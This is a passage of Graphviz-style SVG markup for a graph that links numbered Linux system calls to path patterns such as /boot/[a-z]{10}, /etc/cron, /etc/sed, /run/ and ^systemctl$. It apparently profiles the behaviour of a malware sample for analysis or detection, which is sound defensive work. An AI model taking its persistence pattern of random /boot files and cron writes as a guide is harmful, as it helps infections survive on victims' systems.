x=\"208.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">64._newselect</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"393.73\" cy=\"-178\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"393.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.42,-263.59C2142.01,-261.34 279.29,-249.86 258.73,-229 228.29,-198.1 301.16,-186.12 351.27,-181.6\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"351.58,-185.09 361.25,-180.77 351,-178.11 351.58,-185.09\"/>\n<text text-anchor=\"middle\" x=\"295.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.44,-264.28C2154.47,-265.53 395.02,-268.89 355.73,-229 346.54,-219.66 354.36,-208.06 365.25,-198.39\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"367.52,-201.05 373.11,-192.05 363.13,-195.6 367.52,-201.05\"/>\n<text text-anchor=\"middle\" x=\"383.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.36,-263.66C2163.72,-261.88 482.14,-252.74 433.73,-229 422.88,-223.68 414.04,-213.86 407.44,-204.32\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"410.34,-202.35 402.04,-195.78 404.43,-206.1 410.34,-202.35\"/>\n<text text-anchor=\"middle\" x=\"456.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">19.open</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.51,-263.58C2179.2,-261.46 614.76,-251.17 513.73,-229 497.6,-225.46 494.94,-220.45 479.73,-214 463.02,-206.91 444.37,-199.29 428.72,-192.97\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"429.99,-189.71 419.4,-189.22 427.37,-196.2 429.99,-189.71\"/>\n<text text-anchor=\"middle\" x=\"541.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"746.73\" cy=\"-178\" rx=\"66.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"746.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/boot/[a&#45;z]{10}</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.33,-264.15C2178.52,-264.66 615.84,-264.71 580.73,-229 548.84,-196.55 612.5,-184.99 669.98,-180.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"670.49,-184.44 680.25,-180.32 670.05,-177.45 670.49,-184.44\"/>\n<text text-anchor=\"middle\" x=\"600.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">7.lseek</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.28,-264.1C2185.34,-264.4 676.69,-263.56 642.73,-229 624.87,-210.82 650.45,-198.36 680.71,-190.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"681.76,-193.77 690.64,-188.01 680.1,-186.97 681.76,-193.77\"/>\n<text text-anchor=\"middle\" x=\"668.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">55.stat64</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.25,-264.05C2193.7,-264.08 749.32,-262.19 716.73,-229 709.27,-221.4 713.01,-211.61 720,-202.7\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"722.68,-204.95 726.78,-195.18 717.48,-200.27 722.68,-204.95\"/>\n<text text-anchor=\"middle\" x=\"736.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.open</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.54,-263.53C2202.64,-261.28 817.91,-250.92 778.73,-229 769.29,-223.72 762.21,-214.35 757.14,-205.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"760.28,-203.59 752.74,-196.15 753.99,-206.67 760.28,-203.59\"/>\n<text text-anchor=\"middle\" x=\"802.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">11.clone</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.39,-263.66C2216.34,-262.07 931.8,-254.28 849.73,-229 838.07,-225.41 837.47,-219.8 826.73,-214 815.79,-208.09 803.65,-202.37 792.2,-197.34\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"793.35,-194.02 782.78,-193.27 790.58,-200.45 793.35,-194.02\"/>\n<text text-anchor=\"middle\" x=\"868.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">9.write</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.47,-264.15C2236.11,-264.51 1082.43,-263.49 922.73,-229 906.19,-225.43 903.78,-219.39 887.73,-214 862.1,-205.39 833.2,-197.85 808.27,-192\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"808.74,-188.51 798.21,-189.68 807.17,-195.33 808.74,-188.51\"/>\n<text text-anchor=\"middle\" x=\"939.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">26.rm</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1120.73\" cy=\"-178\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1120.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/boot/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.34,-263.83C2223.76,-262.91 994.71,-257.58 966.73,-229 931.47,-192.98 1021.19,-182.89 1078.09,-180.08\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1078.45,-183.56 1088.29,-179.63 1078.15,-176.57 1078.45,-183.56\"/>\n<text text-anchor=\"middle\" x=\"983.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.rm</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.56,-263.77C2231.3,-262.63 1049.69,-256.55 1022.73,-229 1001.58,-207.38 1044.1,-193.37 1079.61,-185.84\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1080.74,-189.18 1089.86,-183.79 1079.37,-182.32 1080.74,-189.18\"/>\n<text text-anchor=\"middle\" x=\"1042.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.lseek</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.43,-263.7C2238.85,-262.3 1110.55,-255.41 1084.73,-229 1075.89,-219.95 1082.91,-208.59 1093.01,-198.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1095.42,-201.53 1100.74,-192.36 1090.87,-196.21 1095.42,-201.53\"/>\n<text text-anchor=\"middle\" x=\"1110.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">54.stat64</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.37,-264.01C2253.65,-263.79 1220.92,-260.78 1158.73,-229 1148.29,-223.66 1139.91,-213.98 1133.71,-204.54\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1136.57,-202.51 1128.43,-195.72 1130.56,-206.1 1136.57,-202.51\"/>\n<text text-anchor=\"middle\" x=\"1178.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.open</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.27,-263.24C2262.16,-260.29 1284.33,-248.77 1220.73,-229 1209.08,-225.38 1208.43,-219.88 1197.73,-214 1184.27,-206.6 1168.95,-199.41 1155.54,-193.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1156.74,-190.19 1146.17,-189.41 1153.95,-196.61 1156.74,-190.19\"/>\n<text text-anchor=\"middle\" x=\"1244.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">10.clone</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge19\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.52,-263.56C2283.58,-261.83 1426.89,-254.3 1305.73,-229 1288.36,-225.37 1285.64,-219.39 1268.73,-214 1232.96,-202.59 1191.25,-193.06 1161.25,-186.83\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1161.65,-183.34 1151.15,-184.77 1160.25,-190.2 1161.65,-183.34\"/>\n<text text-anchor=\"middle\" x=\"1324.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">8.write</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1460.73\" cy=\"-178\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1460.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge20\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.56,-263.31C2275.13,-260.72 1373.65,-250.5 1352.73,-229 1330.98,-206.64 1372.47,-193.26 1410.16,-186.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1410.9,-189.47 1420.12,-184.26 1409.66,-182.58 1410.9,-189.47\"/>\n<text text-anchor=\"middle\" x=\"1375.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">17.lseek</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge21\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.7,-263.19C2285.28,-260.25 1441.4,-249.25 1421.73,-229 1413.03,-220.04 1419.7,-209.2 1429.83,-199.91\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1432.16,-202.53 1437.65,-193.46 1427.71,-197.13 1432.16,-202.53\"/>\n<text text-anchor=\"middle\" x=\"1450.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">48.rename</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge22\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.4,-263.32C2301.29,-260.91 1549.61,-251.74 1502.73,-229 1491.65,-223.62 1482.4,-213.79 1475.43,-204.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1478.18,-202.07 1469.69,-195.73 1472.37,-205.98 1478.18,-202.07\"/>\n<text text-anchor=\"middle\" x=\"1525.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge23\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.78,-263.05C2322.89,-260.06 1676.78,-249.73 1583.73,-229 1567.22,-225.32 1564.38,-220.46 1548.73,-214 1533.03,-207.51 1515.66,-200.56 1500.53,-194.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1501.54,-191.21 1490.95,-190.79 1498.97,-197.72 1501.54,-191.21\"/>\n<text text-anchor=\"middle\" x=\"1606.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">18.write</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1787.73\" cy=\"-178\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1787.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/sed</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge24\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.44,-264.15C2320.67,-264.2 1671.09,-261.49 1639.73,-229 1607.62,-195.72 1683.94,-184.59 1738.5,-180.87\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1738.98,-184.35 1748.74,-180.24 1738.55,-177.36 1738.98,-184.35\"/>\n<text text-anchor=\"middle\" x=\"1661.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.fcntl</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge25\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.27,-263.94C2331.02,-263.38 1734.71,-259.1 1705.73,-229 1689.24,-211.86 1716.6,-198.3 1744.06,-189.64\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1745.11,-192.98 1753.7,-186.79 1743.12,-186.27 1745.11,-192.98\"/>\n<text text-anchor=\"middle\" x=\"1735.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">46.fchown</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge26\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.46,-263.6C2345.39,-262.17 1815.02,-255.87 1788.73,-229 1782.93,-223.07 1781.32,-214.59 1781.58,-206.3\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1785.09,-206.43 1782.74,-196.1 1778.14,-205.64 1785.09,-206.43\"/>\n<text text-anchor=\"middle\" x=\"1809.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">44.fstat</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge27\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.5,-263.09C2365.02,-260.58 1917.69,-252.12 1853.73,-229 1849.13,-227.34 1830.73,-213.28 1814.53,-200.49\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1816.35,-197.47 1806.34,-194 1811.99,-202.95 1816.35,-197.47\"/>\n<text text-anchor=\"middle\" x=\"1884.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">47.fchmod</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge28\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.7,-263.11C2396.11,-260.85 2064.11,-253.21 1952.73,-229 1934.99,-225.14 1931.96,-219.75 1914.73,-214 1887.28,-204.83 1855.93,-196.17 1831.25,-189.76\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1832.01,-186.34 1821.45,-187.24 1830.27,-193.12 1832.01,-186.34\"/>\n<text text-anchor=\"middle\" x=\"1975.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">45.write</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2085.73\" cy=\"-178\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2085.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge29\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2548.16,-262.44C2386.59,-258.78 2024.09,-248.42 2005.73,-229 1992.65,-215.16 2007.96,-203.57 2028.57,-195.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2029.89,-198.3 2037.99,-191.47 2027.4,-191.75 2029.89,-198.3\"/>\n<text text-anchor=\"middle\" x=\"2034.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">12.shmget</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge30\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2547.32,-264.62C2406.01,-264.94 2117.84,-261.54 2086.73,-229 2081,-223 2079.41,-214.5 2079.67,-206.22\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2083.17,-206.36 2080.81,-196.03 2076.21,-205.58 2083.17,-206.36\"/>\n<text text-anchor=\"middle\" x=\"2113.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.umask</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge31\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2548.52,-261.75C2440.03,-257.92 2246.79,-248.55 2179.73,-229 2157.97,-222.66 2135.49,-210.92 2117.97,-200.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2119.64,-197.33 2109.29,-195.06 2115.97,-203.29 2119.64,-197.33\"/>\n<text text-anchor=\"middle\" x=\"2215.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.exit_group</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2451.73\" cy=\"-178\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2451.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge32\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2548.19,-262.09C2446.36,-258.74 2276.87,-250.04 2257.73,-229 2253.25,-224.07 2253.46,-219.12 2257.73,-214 2277.25,-190.65 2363.28,-182.85 2413.99,-180.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2414.41,-183.75 2424.24,-179.79 2414.09,-176.76 2414.41,-183.75\"/>\n<text text-anchor=\"middle\" x=\"2280.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">59.write</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge33\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2549.69,-260.34C2466.02,-255.47 2340.41,-245.5 2325.73,-229 2298.17,-198.02 2368.22,-186 2414.58,-181.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2414.99,-184.99 2424.64,-180.62 2414.37,-178.02 2414.99,-184.99\"/>\n<text text-anchor=\"middle\" x=\"2362.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge34\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2549.38,-260.82C2498.95,-256.93 2438.95,-248.27 2422.73,-229 2415.36,-220.24 2420.32,-209.36 2428.08,-199.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2430.76,-202.24 2435.05,-192.55 2425.66,-197.46 2430.76,-202.24\"/>\n<text text-anchor=\"middle\" x=\"2441.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge35\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2554.05,-257.56C2529.69,-252.63 2503.37,-244.01 2482.73,-229 2474.27,-222.85 2467.62,-213.61 2462.68,-204.75\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2465.79,-203.14 2458.16,-195.79 2459.54,-206.3 2465.79,-203.14\"/>\n<text text-anchor=\"middle\" x=\"2505.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge36\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2590.46,-248.7C2578.08,-242.88 2564.11,-235.96 2551.73,-229 2541.1,-223.02 2539.43,-219.88 2528.73,-214 2514.3,-206.07 2497.74,-198.38 2483.69,-192.23\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2484.98,-188.97 2474.41,-188.24 2482.21,-195.4 2484.98,-188.97\"/>\n<text text-anchor=\"middle\" x=\"2577.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge37\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2621.31,-246.77C2618.25,-235.83 2612.67,-222.23 2602.73,-214 2570.86,-187.58 2522.76,-180.28 2489.45,-178.65\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2489.3,-175.15 2479.19,-178.31 2489.07,-182.14 2489.3,-175.15\"/>\n<text text-anchor=\"middle\" x=\"2637.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.open</text>\n</g>\n<!-- 9 -->\n<g id=\"node10\" class=\"node\">\n<title>9</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2796.73\" cy=\"-178\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2796.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge38\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2647.14,-247.5C2665.64,-233.96 2689.66,-216.61 2694.73,-214 2716.24,-202.93 2742.01,-194.12 2762.27,-188.11\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2763.38,-191.43 2772.02,-185.3 2761.44,-184.71 2763.38,-191.43\"/>\n<text text-anchor=\"middle\" x=\"2717.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">53.open</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge39\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2680.43,-252.47C2700.24,-247.03 2722.2,-239.39 2740.73,-229 2753.78,-221.69 2766.38,-210.88 2776.32,-201.19\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2778.82,-203.64 2783.36,-194.07 2773.84,-198.72 2778.82,-203.64\"/>\n<text text-anchor=\"middle\" x=\"2784.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">61.write</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge40\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2698.33,-259.42C2743.21,-254.91 2794.58,-246.1 2808.73,-229 2814.44,-222.1 2813.84,-212.94 2810.99,-204.34\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2814.17,-202.87 2807.04,-195.03 2807.72,-205.6 2814.17,-202.87\"/>\n<text text-anchor=\"middle\" x=\"2836.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge41\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.92,-263.26C2763.6,-260.83 2843.03,-252.96 2863.73,-229 2877.6,-212.95 2853.81,-198.94 2830.83,-189.86\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2831.74,-186.46 2821.14,-186.28 2829.31,-193.03 2831.74,-186.46\"/>\n<text text-anchor=\"middle\" x=\"2890.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- 10 -->\n<g id=\"node11\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2966.73\" cy=\"-178\" rx=\"29.5\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2966.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/perl/</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge42\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2699.91,-260.56C2773.48,-256.2 2879.71,-246.99 2916.73,-229 2929.16,-222.96 2940.32,-212.58 2948.92,-202.83\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2951.82,-204.82 2955.53,-194.9 2946.44,-200.34 2951.82,-204.82\"/>\n<text text-anchor=\"middle\" x=\"2956.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.stat</text>\n</g>\n<!-- 11 -->\n<g id=\"node12\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3195.73\" cy=\"-178\" rx=\"53.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3195.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^systemctl$</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge43\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2700.3,-260.88C2772.42,-256.87 2883.82,-248.02 2978.73,-229 3001.07,-224.52 3005.67,-219.66 3027.73,-214 3064.87,-204.47 3107.12,-195.68 3139.97,-189.29\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3140.68,-192.71 3149.84,-187.38 3139.36,-185.84 3140.68,-192.71\"/>\n<text text-anchor=\"middle\" x=\"3049.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.exec</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge44\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.37,-262.55C2810.41,-259.7 3004.47,-251.56 3070.73,-229 3082.29,-225.07 3082.77,-219.35 3093.73,-214 3110.33,-205.9 3129.28,-198.84 3146.31,-193.23\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3147.62,-196.48 3156.08,-190.1 3145.48,-189.82 3147.62,-196.48\"/>\n<text text-anchor=\"middle\" x=\"3133.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">71.getsockopt</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge45\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.81,-263.47C2843.86,-261.87 3136.01,-255.36 3173.73,-229 3181.53,-223.55 3186.59,-214.7 3189.87,-205.95\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3193.24,-206.89 3192.86,-196.3 3186.56,-204.81 3193.24,-206.89\"/>\n<text text-anchor=\"middle\" x=\"3210.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.wait4</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge46\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.48,-262.39C2861.92,-258.65 3219.6,-248.2 3237.73,-229 3246.38,-219.85 3239.62,-209.23 3229.2,-200.14\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3231.16,-197.23 